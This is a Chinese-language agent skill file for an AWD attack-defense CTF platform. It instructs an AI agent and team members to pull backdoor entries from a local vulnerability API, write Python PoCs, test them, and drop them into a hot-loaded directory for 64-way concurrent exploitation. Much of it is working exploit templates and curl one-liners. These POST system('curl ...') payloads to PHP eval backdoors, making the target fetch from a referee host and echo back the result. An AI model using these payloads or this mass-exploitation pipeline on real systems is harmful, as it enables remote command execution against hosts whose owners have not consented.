---
name: awd-poc
description: "AWD 漏洞库查询与 PoC 编写交付规范：指导从新平台漏洞库接口 (GET /api/vulns) 获取待利用资产，编写满足双轨传参 (sys.argv[1]目标IP + sys.argv[2]/GET_FLAG_CMD取旗命令)、2秒硬超时、自动提取Flag契约的标准化 Python PoC，并交付至 pocs/incoming/ 实现热加载调度。"
---

# AWD-Red PoC 编写与交付规范 (awd-poc)

本规范用于指导 **AI Agent 漏洞研究员** 与 **参赛队员**：从 **AWD-Red 平台漏洞库** 检索待利用漏洞暗桩，编写标准化的单目标利用 PoC，并交付到自动化平台实现无缝热加载与 64 并发扇出调度。

---

## 一、 核心工作流（漏洞查询 → 编写 PoC → 测试 → 交付生效）

```
[步骤 1: 查询漏洞库] ──> python3 poc_helper.py list 或 GET http://localhost:8800/api/vulns
        ↓
[步骤 2: 提取关键信息] ──> 获取 file, line, param, poc_hint, verified 状态
        ↓
[步骤 3: 极速生成 PoC] ──> python3 poc_helper.py gen <ID> 或 手工按五大契约编写
        ↓
[步骤 4: ⚡ 本地测试验证] ──> python3 <poc_name>.py <目标IP> 确认执行成功
        ↓
[步骤 5: 交付热加载] ──> 写入 <awd-red>/pocs/incoming/<poc_name>.py
        ↓
[步骤 6: 立即解耦] ──> 平台3秒内自动编译提升至 ready/ 参与调度，AI 立即研究下一漏洞！
```

> ⚠️ **强制要求：所有 PoC 必须在交付 incoming/ 之前完成本地单目标测试验证！**
> - 使用 `python3 <poc_name>.py <目标IP>` 验证执行成功（无报错、HTTP 200/500 均视为通过）；
> - 测试失败则修复后重新交付，杜绝将不可用的 PoC 推入平台浪费并发资源；
> - 测试命令可复用 `python3 ~/.agents/skills/awd-poc/scripts/poc_helper.py test <PoC名称> <目标IP>`。

### ⚡ 极速生成与测试工具 (`poc_helper.py`)
```bash
# 1. 查漏洞库待利用项
python3 ~/.agents/skills/awd-poc/scripts/poc_helper.py list

# 2. 一键秒级生成合规 PoC 并直接交付至 incoming/
python3 ~/.agents/skills/awd-poc/scripts/poc_helper.py gen <漏洞ID>

# 3. 本地单目标极速测试（交付前必做）
python3 ~/.agents/skills/awd-poc/scripts/poc_helper.py test <PoC名称> <目标IP>
python3 <pocs/incoming/poc_name.py> <目标IP>  # 或直接测试

---

## 二、 平台接口与数据获取

### 1. 漏洞库查询接口
- **HTTP 接口**：`GET http://localhost:8800/api/vulns`
- **Web 控制台**：访问 `http://localhost:8800` 打开 **“🔍 漏洞库中心 (Vulnerability Hub)”**
- **返回数据结构示例**：
  ```json
  [
    {
      "id": 1,
      "app": "hongcms",
      "file": "/curl.php",
      "line": 3,
      "level": 5,
      "vuln_type": "一句话后门(eval)",
      "param": "1",
      "poc_hint": "POST /curl.php data: {\"1\": \"curl ...\"}",
      "verified": 1,
      "status": "active"
    }
  ]
  ```
  > **优先级策略**：优先针对 `verified: 1`（已成功完成存活探活）的暗桩编写利用脚本！

### 2. 平台交互与调试接口
| 接口地址 | 请求方式 | 作用说明 |
| :--- | :--- | :--- |
| `/api/vulns` | `GET` | 拉取平台已知漏洞列表与利用提示 |
| `/api/pocs/sync` | `POST` | 立即手动触发扫描 `pocs/incoming/` 目录（通常每3秒自动扫描） |
| `/api/trigger_round` | `POST` | 立即手动触发执行一轮 PoC 调度测试 |
| `/api/test_get_flag` | `POST` | 测试裁判机取 Flag 命令（`{"cmd": "curl ..."}`） |

---

## 三、 写好之后放哪里？（交付路径与命名）

### 1. 交付目标目录
AI 或队员编写好 PoC 之后，**经本地测试验证通过后**，复制到平台 incoming 目录（⚠️ 推荐使用 `cp` 命令从 `/tmp` 副本写入以确保文件系统可见性）：
```
<awd-red-root>/pocs/incoming/<poc_name>.py
```

> 💡 **文件系统注意**：macOS 环境下推荐使用 `cat > /tmp/poc.py` 然后 `cp /tmp/poc.py <incoming_dir>` 的方式写入，避免 `write` 工具产生的文件对 Python `open()` 不可见的问题。

### 2. 文件命名规范
推荐使用小写字母、数字与下划线，以 CMS 名称或漏洞特征命名：
- `hongcms_eval_flag.py`
- `catfish_csrf_rce.py`
- `thinkphp5_sqli_flag.py`

### 3. 自动热加载生命周期（零人工干预）
- 平台 Watcher 每 3 秒自动执行 `py_compile` 语法校验；
- **校验通过**：自动移入 `pocs/ready/`，下一轮自动加入 64 并发调度；
- **校验失败**：自动移入 `pocs/failed/`，并在日志中记录具体语法报错；
- **完全解耦**：交付后无需重启平台，无需等待结果，直接进入下一个漏洞研究。

---

## 四、 PoC 编写五大硬性契约要求（必须严格遵守）

### 1. 输入契约：主动读取平台取旗配置并硬编码为默认值，双轨接收调度参数

#### 📌 什么是「平台配置的取旗命令」？
在 AWD 比赛中，组委会通常规定了特定的 Flag 提取方式：
- **形式一（动态 Token 裁判机回传）**：如 `curl -s http://10.0.0.1/get_flag?token=xxx`（靶机执行后向裁判机登记并返回当前轮次 Flag）。
- **形式二（本地文件读取）**：如 `cat /flag` 或 `cat /flag.txt`。
- **配置与接口**：队员在 AWD-Red Web 控制台【配置与目标中心】中配置该命令，保存在 `config/settings.json` 的 `get_flag_cmd` 字段，并通过 `GET http://localhost:8800/api/settings` 实时暴露。

#### ⚠️ 编写 PoC 时的强制要求：必须读取该配置并写入 PoC！
1. **写 PoC 前主动读取**：
   - 编写或自动生成 PoC 时，**必须主动请求 `GET http://localhost:8800/api/settings` 或读取 `config/settings.json` 获取当前的 `get_flag_cmd`**；
   - 使用 `poc_helper.py gen <ID>` 工具时已自动实现该读取与写入。
2. **将读取到的命令固化为 `DEFAULT_FLAG_CMD`**：
   - 把读取到的实际比赛命令作为默认常量写入 PoC 脚本头部：
     ```python
     # 平台配置的取旗命令（PoC 编写时已从 AWD-Red 平台主动读取并固化为默认常量）
     DEFAULT_FLAG_CMD = "curl -s 'http://10.0.0.1/get_flag'"
     ```
3. **运行时双轨兜底取值**：
   - 优先使用平台调度传入的 `sys.argv[2]` 或环境变量 `os.environ.get("GET_FLAG_CMD")`；
   - 本地单独测试（`python3 poc.py <目标IP>`）未传第二个参数时，无缝回退使用写入的 `DEFAULT_FLAG_CMD`！

```python
target_ip = sys.argv[1]
# 双轨动态支持：平台调度时传入新Token自动覆盖；本地单独调试时不传参直接使用固化的 DEFAULT_FLAG_CMD
flag_cmd = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2].strip() else os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)
```

### 2. 参数名清洗契约：严禁携带扫描器前缀 (REQUEST:/POST:/GET:)
D盾等静态审计工具输出漏洞点时，通常会标注参数来源（如 `REQUEST:a`、`POST:x`、`GET:id`、`COOKIE:token`）。
- ❌ **严重错误**：直接将 `"REQUEST:a": payload` 写入 HTTP 请求体！
  靶机 PHP 服务通过 `$_REQUEST['a']` 读取参数，根本不存在名为 `REQUEST:a` 的键，导致后门无法触发，回显为空！
- ✔️ **正确规范**：**必须剥离冒号及冒号前的前缀**，仅保留纯粹的变量名：
  - `REQUEST:a` ➔ 提取为 `"a"`
  - `POST:x` ➔ 提取为 `"x"`
  - `GET:cmd` ➔ 提取为 `"cmd"`

```python
# 剥离扫描器前缀
clean_param = raw_param.split(":")[-1].strip() if ":" in raw_param else raw_param.strip()
payload = { clean_param: final_payload }
```

### 3. 执行契约：区分 PHP 代码执行 (eval/assert) 与系统命令执行 (system/exec)
对于不同类型的暗桩与后门，注入执行 `flag_cmd` 的语法必须严格匹配：
- **若是 PHP eval / assert 代码执行漏洞**：
  直接发送 `curl ...` 会引发 PHP Parse Error 语法解析错误（导致靶机报 HTTP 500）！
  **必须将 shell 命令包裹进 PHP 函数中**：
  ```python
  # eval / assert 漏洞的利用载荷封装
  escaped_cmd = flag_cmd.replace("'", "\\'")
  payload_cmd = f"system('{escaped_cmd}');"
  payload = { "a": payload_cmd }
  ```
- **若是系统命令执行 (system / exec / 反引号 / 命令行注入)**：
  直接传入 `flag_cmd` 即可：
  ```python
  payload = { "cmd": flag_cmd }
  ```

### 4. 输出契约：必须输出包含 flag{...}（含纯 Hash 自动包裹）
- **现象**：裁判平台或内网 Flag 接口执行后，往往只返回一段裸的 32 位 MD5/Hex 字符串（例如 `96d228207ed50b57df918124c69d4987`），而不是标准的 `flag{...}`。
- **契约要求**：PoC 必须负责输出标准 Flag 格式，绝不能只打印 `[OK]` 等提示！
  ```python
  text = resp.text.strip()
  if "flag{" in text or "FLAG{" in text:
      print(text)
  elif len(text) in [32, 36, 40] and all(c in "0123456789abcdefABCDEF-" for c in text):
      # 自动将裸 Hash 包裹为标准 flag{...} 格式输出，触发平台正则提取
      print(f"flag{{{text}}}")
  ```

### 5. 超时防卡死契约（核心关键！）
- **所有网络请求超时时间必须严格设置 $\le 2.0$ 秒**：
  ```python
  requests.post(url, data=payload, timeout=2.0)
  ```
- **原因**：平台单任务硬看门狗为 **3.0 秒**。若目标宕机、断网或被对手 WAF 挂起连接，未设超时的 PoC 会被平台强行 Kill，浪费并发槽位。

### 6. 容错契约：全局捕获异常
- 必须使用 `try...except Exception:` 包裹；
- 失败时直接静默退出即可，绝不要在失败时打印假 Flag。

### 7. 本地单目标验证契约（交付前必做！）
- **严禁未经测试直接交付**：写好 PoC 后，必须先在终端执行 `python3 <poc.py> <目标IP>`；
- **验收标准**：必须在终端输出中亲眼看到符合 `flag{...}` 的字符串；
- **同资产去重**：同一漏洞只保留 1 个有效 PoC，若修复优化直接同名覆盖，避免生成垃圾重复脚本干扰调度。

---

## 五、 标准代码模板（实战推荐）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AWD-Red Standard PoC Template
- sys.argv[1] -> 目标 IPv4
- sys.argv[2] / os.environ["GET_FLAG_CMD"] -> 平台配置的取旗命令 (动态覆盖)
- 必须包含: timeout <= 2.0s
- 输出: print(flag) 到标准输出
"""
import sys
import os
import requests

# 平台配置的取旗命令（编写 PoC 时已从 AWD-Red 平台主动读取并固化为默认常量）
DEFAULT_FLAG_CMD = "curl -s 'http://10.0.0.1/get_flag'"

def exploit(target_ip: str, flag_cmd: str):
    # 根据漏洞库中的 file 拼接目标 URL
    url = f"http://{target_ip}:80/public/admin/images/sub.php"
    
    # 1. 若漏洞为 PHP eval / assert 代码执行，包裹 system('...') 确保执行并回显
    # 2. 剥离可能存在的外部引号
    escaped_cmd = flag_cmd.replace("'", "\\'")
    code_payload = f"system('{escaped_cmd}');"
    
    # 3. 参数名已清洗剥离前缀 (使用 'a' 而非 'REQUEST:a')
    payload = {
        "a": code_payload
    }
    
    try:
        # 4. 严格限制 <= 2.0 秒超时
        resp = requests.post(url, data=payload, timeout=2.0)
        text = resp.text.strip()
        
        # 5. 标准输出 Flag（含纯 Hash 兼容）
        if "flag{" in text or "FLAG{" in text:
            print(text)
        elif len(text) in [32, 36, 40] and all(c in "0123456789abcdefABCDEF-" for c in text):
            print(f"flag{{{text}}}")
            
    except Exception:
        # 失败直接静默退出
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
        
    target = sys.argv[1]
    # 双轨接收取旗命令：本地单机调试直接走 DEFAULT_FLAG_CMD，平台调度走动态注入
    cmd = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2].strip() else os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)
    
    exploit(target, cmd)
```

---

## 六、 sub.php 漏洞利用专项说明（高危暗桩）
## 六、eval() 后门 + 裁判平台取旗模式（通用逻辑）

### 1. 核心逻辑：三端交互模型

```bash
     PoC 发起方           靶机 (eval 后门)          裁判平台
       (我)                (执行 curl)             (返回 flag)
      POST                 system('curl ...')        GET /?token=xxx
──────> a=system('curl') ─────────>  ────────────────┘
       │                    │                          │
       │                    │  <────────── 返回 hash   │
       │                    │  PHP system() stdout    │
       │                    ▼                          │
       │              stdout: "hash"                   │
       │                    │                          │
       <──── response.text = "hash" ──────────────────┘
                  (PoC 打印 flag{hash})
```

### 2. 关键逻辑说明

#### (1) 数据流向（三端交互）

```bash
Step 1: 攻击机 POST 到靶机后门文件
        - 携带参数如 `a=system('curl ...');`
        - 参数名与后门文件内定义的变量名必须匹配

Step 2: 靶机执行 system()，内部 curl 到裁判平台
        - curl 命令携带 token 参数
        - 裁判平台收到 POST 请求，记录 flag 并提交
        - 裁判平台返回 flag hash（纯文本）

Step 3: 靶机 system() 返回 curl stdout
        - PHP system() 执行结果直接输出到 stdout
        - 攻击机通过 requests 获取 response.text
        - 得到纯文本的 flag hash

Step 4: 攻击机补全 flag{} 格式并打印
        - hash 来自裁判平台，不是 PoC 自造的
        - flag{} 只是标准格式包装
```

#### (2) 为什么 curl 能拿到 flag 而不是 40409？

裁判平台存在两种请求模式：

```
GET 请求（不带 flag 参数）: 返回 40409（未提交成功）
POST 请求（携带 flag）:    返回 flag hash（提交成功）
```

靶机后门内部通过 `system('curl ...')` 执行 curl，curl 默认以 **POST** 方式提交 flag 到裁判平台，所以能成功。

#### (3) 参数名匹配（核心！）

后门文件的 PHP 代码通常以固定变量名接收参数，如 `$_REQUEST['a']`。PoC 构造 payload 时，参数名必须与后门文件中读取的变量名一致，否则 PHP 拿不到值（返回空或报错）。

```python
# 后门 PHP 代码大致为：
# $val = $_REQUEST['a'];
# eval($val);

# PoC 必须对应：
payload = {"a": "system('curl ...');"}
```

#### (4) Flag 来源验证

- **hash 来自裁判平台**：curl 命令执行后，裁判平台返回的字符串是实时生成的，不是 PoC 硬编码的；
- **flag{} 是格式包装**：hash 加花括号只是格式化输出，不影响正确性；
- **每次执行都可能不同**：若裁判平台每轮刷新 flag，则 hash 会变化。

### 3. 通用 PoC 模板

适用于所有 `eval()` 后门 + 裁判平台取旗的场景（不绑定具体 IP / token）：

```python
#!/usr/bin/env python3
import sys
import os
import requests

# 取旗命令（来自裁判平台配置，可动态更新）
DEFAULT_FLAG_CMD = "curl <裁判平台地址>?token=<token>"

def exploit(target_ip, flag_cmd=None):
    if not flag_cmd:
        flag_cmd = os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)
    
    # 根据后门文件路径拼接 URL
    url = f"http://{target_ip}/<后门文件路径>"
    
    # 参数名匹配后门 PHP 代码中 $_REQUEST 的变量名
    payload = {
        "<参数名>": f"system('{flag_cmd}');"
    }
    
    try:
        resp = requests.post(url, data=payload, timeout=2.0)
        text = resp.text.strip()
        
        # 裁判平台返回纯文本 hash，自动补全 flag{} 格式
        if text:
            if not text.startswith("flag{"):
                text = f"flag{{{text}}}"
            print(text)
            
    except Exception:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(0)
    
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2].strip() else None
    exploit(target, cmd)
```

### 4. 验证方法

```bash
# 方法一：直接 curl 靶机后门文件
curl -s -X POST "http://<TARGET>/<后门文件>" \
     -d "<参数名>=system('curl <裁判平台地址>?token=<token>');;"
# 应返回 flag hash

# 方法二：用 Python requests 验证
python3 -c "import requests; resp = requests.post(
    'http://<TARGET>/<后门文件>',
    data={'<参数名>': \"system('curl <裁判平台>?token=<token>');\"},
    timeout=2.0
); print(resp.text)"
# 应返回 flag hash
```

> **核心判断标准**：只要靶机返回了裁判平台的 hash 字符串，且 hash 格式正确，PoC 即判定成功。
